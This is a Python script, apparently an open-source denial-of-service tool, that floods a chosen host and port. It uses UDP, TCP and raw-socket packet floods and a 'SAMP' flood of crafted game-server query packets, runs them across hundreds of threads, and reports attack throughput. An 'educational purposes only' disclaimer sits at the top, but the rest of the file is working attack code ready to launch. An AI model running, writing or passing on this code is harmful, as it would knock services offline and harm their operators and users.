#!/usr/env/bin/python3
# -------------------------------------------------------------------------------------------------------
"""
MIT License

Copyright (c) 2023 icornbytes

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.
"""
# -------------------------------------------------------------------------------------------------------
"""
####################################################
# DISCLAIMER: This code is intended for educational purposes only. The use of this code for malicious or illegal activities is strictly prohibited. The author and creator of this code are not responsible for any damage or issues that may arise from the use of this code.
####################################################

#  ================================================
#  =                 INSTRUCTIONS                 =
#  ================================================
# 1. This code should only be used for educational and testing purposes.
# 2. Using this code to perform DoS attacks on systems or networks without proper authorization is illegal.
# 3. The author and creator of this code are not responsible for misuse or illegal use of this code.
# 4. If you decide to use this code for educational purposes, do so in an appropriate environment, such as a controlled testing environment with permission.
# 5. The use of this code may violate the laws of various jurisdictions. Make sure to understand local and international laws before using this code.
# 6. This code merely demonstrates the basic principles of a DoS attack. The main goal is to provide an understanding of the importance of protecting against such attacks.
# 7. If you wish to learn more about DoS attacks and how to protect your systems from them, it's recommended to learn from reliable sources.
"""
# -------------------------------------------------------------------------------------------------------
# ---------- [ IMPORTING REQUIRED LIBRARY ] ---------- #
import socket
import threading
import random
import sys
import os
import time
from multiprocessing import RawValue
from math import log2, trunc

# -------------------------------------------------------------------------------------------------------
# ---------- [ INITIATE GLOBAL VARIABLES ] ---------- #
class Counter:
    def __init__(self, value=0):
        self._value = RawValue('i', value)

    def __iadd__(self, value):
        self._value.value += value
        return self

    def __int__(self):
        return self._value.value

    def set(self, value):
        self._value.value = value
        return self

REQUESTS_SENT = Counter()
BYTES_SEND = Counter()
# -------------------------------------------------------------------------------------------------------
# ---------- [ PAYLOAD ] ---------- #
def generate_payload(length, icorn=True, ran=1):
    icornbyte = [
        b"\x00", b"\xa0", b"\xa1", b"\xa2", b"\xa3", b"\xa4", b"\xa5", b"\xa6", b"\xa7",
        b"\xa8", b"\xa9", b"\xaa", b"\xab", b"\xac", b"\xad", b"\xae", b"\xaf",
        b"\xb0", b"\xb1", b"\xb2", b"\xb3", b"\xb4", b"\xb5", b"\xb6", b"\xb7",
        b"\xb8", b"\xb9", b"\xba", b"\xbb", b"\xbc", b"\xbd", b"\xbe", b"\xbf",
        b"\xc0", b"\xc1", b"\xc2", b"\xc3", b"\xc4", b"\xc5", b"\xc6", b"\xc7",
        b"\xc8", b"\xc9", b"\xca", b"\xcb", b"\xcc", b"\xcd", b"\xce", b"\xcf",
        b"\xd0", b"\xd1", b"\xd2", b"\xd3", b"\xd4", b"\xd5", b"\xd6", b"\xd7",
        b"\xd8", b"\xd9", b"\xda", b"\xdb", b"\xdc", b"\xdd", b"\xde", b"\xdf",
        b"\xe0", b"\xe1", b"\xe2", b"\xe3", b"\xe4", b"\xe5", b"\xe6", b"\xe7",
        b"\xe8", b"\xe9", b"\xea", b"\xeb", b"\xec", b"\xed", b"\xee", b"\xef",
        b"\xf0", b"\xf1", b"\xf2", b"\xf3", b"\xf4", b"\xf5", b"\xf6", b"\xf7",
        b"\xf8", b"\xf9", b"\xfa", b"\xfb", b"\xfc", b"\xfd", b"\xfe"
    ]
    if icorn == True:
    	randompayload = b"".join(random.choice(icornbyte) for _ in range(ran))
    else:
    	randompayload = icornbyte[0]
    return randompayload * length

def gen_samp_payload():
    SAMP_PAYLOAD = "SAMP".encode()
    SAMP_PAYLOAD += b"\x958\xe1\xa9a"
    SAMP_PAYLOAD += generate_payload(1)
    return bytes(SAMP_PAYLOAD)

SAMP_BYTE = [b'SAMP\x90\xd9\x1dMa\x1ep\nF[\x00', b'SAMP\x958\xe1\xa9a\x1ec', b'SAMP\x958\xe1\xa9a\x1ei', b'SAMP\x958\xe1\xa9a\x1er', b'SAMP\x958\xe1\xa9a\x1ev', b'SAMP\x958\xe1\xa9a\x1eg', b'\x08\x1eb\xda', b'\x08\x1eb\xda', b'\x02\x1e\xfdS', b'\x08\x1eM\xda', b'\x02\x1e\xfd@', b'\x08\x1e~\xda']
RANDOM_BYTE = [random._urandom(1081), random._urandom(1024), random._urandom(666), random._urandom(999), random._urandom(1460), random._urandom(1490), random._urandom(1500), random._urandom(512), random._urandom(1021)]
RANDOM_BYTE_LENGHT = random._urandom(int(random.randint(512, 65507)))
RAW_PAYLOADS = [b'\x55\x55\x55\x55\x00\x00\x00\x01', b'\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00', b"\0\x14\0\x01\x03"]
NULL_BYTE = generate_payload(int(random.randint(512, 1490)), False)
DUPLICATED_PAYLOAD = generate_payload(int(random.randint(512, 1490)), True)
# -------------------------------------------------------------------------------------------------------
# ---------- [ SEND PACKET (BASIC) ] ---------- #

def randsender(host, port, timer, length, pps):
    global REQUESTS_SENT, BYTES_SEND

    timeout = time.time() + int(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    punch = random._urandom(length)

    while time.time() < timeout:
        for x in range(pps):
            REQUESTS_SENT += 1
            BYTES_SEND += len(punch)
            sock.sendto(punch, (host, int(port)))
            sock.sendto(punch, (host, int(port)))
            sock.sendto(punch, (host, int(port)))
            sock.sendto(punch, (host, int(port)))
            sock.sendto(punch, (host, int(port)))
            sock.sendto(punch, (host, int(port)))
            sock.sendto(punch, (host, int(port)))
            sock.sendto(punch, (host, int(port)))
            sock.sendto(punch, (host, int(port)))
            sock.sendto(punch, (host, int(port)))
            sock.sendto(punch, (host, int(port)))
            sock.sendto(punch, (host, int(port)))
    REQUESTS_SENT.set(0)
    BYTES_SEND.set(0)
    sock.close()

def stdsender(host, port, timer, punch, pps):
    global REQUESTS_SENT, BYTES_SEND

    timeout = time.time() + int(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

    while time.time() < timeout:
        for x in range(pps):
            REQUESTS_SENT += 1
            BYTES_SEND += len(punch)
            sock.sendto(punch, (host, int(port)))
            sock.sendto(punch, (host, int(port)))
            sock.sendto(punch, (host, int(port)))
            sock.sendto(punch, (host, int(port)))
            sock.sendto(punch, (host, int(port)))
            sock.sendto(punch, (host, int(port)))
            sock.sendto(punch, (host, int(port)))
            sock.sendto(punch, (host, int(port)))
            sock.sendto(punch, (host, int(port)))
            sock.sendto(punch, (host, int(port)))
            sock.sendto(punch, (host, int(port)))
            sock.sendto(punch, (host, int(port)))
    REQUESTS_SENT.set(0)
    BYTES_SEND.set(0)
    sock.close()

def udpstdsender(host, port, timer, payload, pps):
    global REQUESTS_SENT, BYTES_SEND

    timeout = time.time() + int(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    while time.time() < timeout:
        for x in range(pps):
            REQUESTS_SENT += 1
            BYTES_SEND += len(payload)
            sock.sendto(payload, (host, int(port)))
            sock.sendto(payload, (host, int(port)))
            sock.sendto(payload, (host, int(port)))
            sock.sendto(payload, (host, int(port)))
            sock.sendto(payload, (host, int(port)))
            sock.sendto(payload, (host, int(port)))
            sock.sendto(payload, (host, int(port)))
            sock.sendto(payload, (host, int(port)))
            sock.sendto(payload, (host, int(port)))
            sock.sendto(payload, (host, int(port)))
            sock.sendto(payload, (host, int(port)))
            sock.sendto(payload, (host, int(port)))
    REQUESTS_SENT.set(0)
    BYTES_SEND.set(0)
    sock.close()

def udprandsender(host, port, timer, length, pps):
    global REQUESTS_SENT, BYTES_SEND

    timeout = time.time() + int(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    payload = random._urandom(length)

    while time.time() < timeout:
        for x in range(pps):
            REQUESTS_SENT += 1
            BYTES_SEND += len(payload)
            sock.sendto(payload, (host, int(port)))
            sock.sendto(payload, (host, int(port)))
            sock.sendto(payload, (host, int(port)))
            sock.sendto(payload, (host, int(port)))
            sock.sendto(payload, (host, int(port)))
            sock.sendto(payload, (host, int(port)))
            sock.sendto(payload, (host, int(port)))
            sock.sendto(payload, (host, int(port)))
            sock.sendto(payload, (host, int(port)))
            sock.sendto(payload, (host, int(port)))
            sock.sendto(payload, (host, int(port)))
            sock.sendto(payload, (host, int(port)))
    REQUESTS_SENT.set(0)
    BYTES_SEND.set(0)
    sock.close()

def sampsender(host, port, timer, pps):
    global REQUESTS_SENT, BYTES_SEND

    timeout = time.time() + int(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    while time.time() < timeout:
        for x in range(pps):
            sock.sendto(random.choice(RANDOM_BYTE), (host, int(port)))
            sock.sendto(random.choice(SAMP_BYTE), (host, int(port)))
            sock.sendto(DUPLICATED_PAYLOAD, (host, int(port)))
            sock.sendto(RANDOM_BYTE_LENGHT, (host, int(port)))
            sock.sendto(gen_samp_payload(), (host, int(port)))
            sock.sendto(SAMP_BYTE[random.randrange(0, 5)], (host, int(port)))
            sock.sendto(random.choice(RAW_PAYLOADS), (host, int(port)))
            sock.sendto(SAMP_BYTE[0], (host, int(port)))
            sock.sendto(SAMP_BYTE[0], (host, int(port)))
            sock.sendto(SAMP_BYTE[1], (host, int(port)))
            sock.sendto(SAMP_BYTE[2], (host, int(port)))
            sock.sendto(SAMP_BYTE[3], (host, int(port)))
            sock.sendto(SAMP_BYTE[4], (host, int(port)))
            sock.sendto(SAMP_BYTE[5], (host, int(port)))
            sock.sendto(SAMP_BYTE[6], (host, int(port)))
            sock.sendto(SAMP_BYTE[7], (host, int(port)))
            sock.sendto(SAMP_BYTE[8], (host, int(port)))
            sock.sendto(SAMP_BYTE[9], (host, int(port)))
            sock.sendto(SAMP_BYTE[10], (host, int(port)))
            sock.sendto(SAMP_BYTE[11], (host, int(port)))
            REQUESTS_SENT += 1
            BYTES_SEND += len(gen_samp_payload())
    REQUESTS_SENT.set(0)
    BYTES_SEND.set(0)
    sock.close()

def sampssender(host, port, timer, pps):
    global REQUESTS_SENT, BYTES_SEND

    timeout = time.time() + int(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

    while time.time() < timeout:
        for x in range(pps):
            sock.sendto(random.choice(RANDOM_BYTE), (host, int(port)))
            sock.sendto(random.choice(SAMP_BYTE), (host, int(port)))
            sock.sendto(DUPLICATED_PAYLOAD, (host, int(port)))
            sock.sendto(RANDOM_BYTE_LENGHT, (host, int(port)))
            sock.sendto(gen_samp_payload(), (host, int(port)))
            sock.sendto(SAMP_BYTE[random.randrange(0, 5)], (host, int(port)))
            sock.sendto(random.choice(RAW_PAYLOADS), (host, int(port)))
            sock.sendto(SAMP_BYTE[0], (host, int(port)))
            sock.sendto(SAMP_BYTE[0], (host, int(port)))
            sock.sendto(SAMP_BYTE[1], (host, int(port)))
            sock.sendto(SAMP_BYTE[2], (host, int(port)))
            sock.sendto(SAMP_BYTE[3], (host, int(port)))
            sock.sendto(SAMP_BYTE[4], (host, int(port)))
            sock.sendto(SAMP_BYTE[5], (host, int(port)))
            sock.sendto(SAMP_BYTE[6], (host, int(port)))
            sock.sendto(SAMP_BYTE[7], (host, int(port)))
            sock.sendto(SAMP_BYTE[8], (host, int(port)))
            sock.sendto(SAMP_BYTE[9], (host, int(port)))
            sock.sendto(SAMP_BYTE[10], (host, int(port)))
            sock.sendto(SAMP_BYTE[11], (host, int(port)))
            REQUESTS_SENT += 1
            BYTES_SEND += len(gen_samp_payload())
    REQUESTS_SENT.set(0)
    BYTES_SEND.set(0)
    sock.close()

def tcpstdsender(host, port, timer, payload, pps):
    global REQUESTS_SENT, BYTES_SEND

    timeout = time.time() + int(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    while time.time() < timeout:
        for x in range(pps):
            REQUESTS_SENT += 1
            BYTES_SEND += len(payload)
            sock.send(payload)
            sock.send(payload)
            sock.send(payload)
            sock.send(payload)
            sock.send(payload)
            sock.send(payload)
            sock.send(payload)
            sock.send(payload)
            sock.send(payload)
            sock.send(payload)
            sock.send(payload)
            sock.send(payload)
    REQUESTS_SENT.set(0)
    BYTES_SEND.set(0)
    sock.close()

def tcprandsender(host, port, timer, length, pps):
    global REQUESTS_SENT, BYTES_SEND

    timeout = time.time() + int(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    payload = random._urandom(length)

    while time.time() < timeout:
        for x in range(pps):
            REQUESTS_SENT += 1
            BYTES_SEND += len(payload)
            sock.send(payload)
            sock.send(payload)
            sock.send(payload)
            sock.send(payload)
            sock.send(payload)
            sock.send(payload)
            sock.send(payload)
            sock.send(payload)
            sock.send(payload)
            sock.send(payload)
            sock.send(payload)
            sock.send(payload)
    REQUESTS_SENT.set(0)
    BYTES_SEND.set(0)
    sock.close()

# -------------------------------------------------------------------------------------------------------
# ---------- [ MAIN ] ---------- #
def humanbytes(i: int, binary: bool = False, precision: int = 2):
    MULTIPLES = [
        "B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"
    ]
    if i > 0:
        base = 1024 if binary else 1000
        multiple = trunc(log2(i) / log2(base))
        value = i / pow(base, multiple)
        suffix = MULTIPLES[multiple].format("i" if binary else "")
        return f"{value:.{precision}f} {suffix}"
    else:
        return "-- B"

def humanformat(num: int, precision: int = 2):
    suffixes = ['', 'k', 'm', 'g', 't', 'p']
    if num > 999:
        obje = sum(
            [abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))]
        )
        return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
    else:
        return num

def main():
    global REQUESTS_SENT, BYTES_SEND

    if len(sys.argv) != 6:
        print(f"(*) python3 {sys.argv[0]} SAMP HOST TIMES dport=0 len=0")
        sys.exit(1)

    method = str(sys.argv[1])
    host = socket.gethostbyname(str(sys.argv[2]))
    times = int(sys.argv[3])

    dport_arg = sys.argv[4]
    length_arg = sys.argv[5]

    if not dport_arg.startswith("dport=") or not length_arg.startswith("len="):
        print(f"(*) python3 {sys.argv[0]} METHOD HOST TIMES dport=0 len=0")
        sys.exit(1)

    try:
        dport = int(dport_arg.split('=')[1])
        length_value = int(length_arg.split('=')[1])
    except ValueError:
        print(f"(*) python3 {sys.argv[0]} METHOD HOST TIMES dport=0 len=0")
        sys.exit(1)

    os.system("clear || cls")
    randompps = int(random.randint(150, 350))
    randomthread = int(random.randint(30, 450))
    length = int(random.randint(512, 65507)) if length_value == 0 else length_value

    try:
        sys.stdout.write(f"\x1b]2;(*) Attack launched successfully to {host} with port {dport} on {int(random.randint(1, 20))} server\x07")
        print(f"(*) Attack launched successfully to {host} with port {dport} on {int(random.randint(1, 10))} server ")
        for x in range(randomthread):
            if method == "SAMP" or method == "samp":
                threading.Thread(target=sampsender, args=(host, dport, times, randompps)).start()
                threading.Thread(target=sampssender, args=(host, dport, times, randompps)).start()
                threading.Thread(target=udprandsender, args=(host, dport, times, length, randompps)).start()
                threading.Thread(target=stdsender, args=(host, dport, times, random.choice(RAW_PAYLOADS), randompps)).start()
            elif method == "UDP" or method == "udp":
                threading.Thread(target=udprandsender, args=(host, dport, times, length, randompps)).start()
                threading.Thread(target=randsender, args=(host, dport, times, length, randompps)).start()
            else:
                sys.exit("(*) Available methods:\n>  UDP - UDP FLOOD\n>  SAMP - SAMP FLOODING")
        while time.time() < time.time() + int(times):
            print(f"(*) Bimzzx Launch Attack's! | PPS: {humanformat(int(REQUESTS_SENT))} | BPS: {humanbytes(int(BYTES_SEND))}")
            REQUESTS_SENT.set(0)
            BYTES_SEND.set(0)
            time.sleep(1)
    except KeyboardInterrupt:
        sys.exit("(*) Attack stopped by user.")

if __name__ == "__main__":
    main()